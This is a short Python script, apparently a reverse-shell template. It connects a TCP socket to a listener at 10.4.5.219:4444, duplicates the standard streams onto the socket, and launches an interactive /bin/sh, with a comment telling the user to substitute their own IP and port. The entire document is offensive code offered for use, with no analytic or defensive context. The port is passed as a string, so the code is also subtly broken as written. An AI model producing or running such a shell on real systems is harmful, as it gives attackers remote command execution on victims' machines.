import subprocess
import socket
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.4.5.219","4444"))  #replace with your ip and port
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
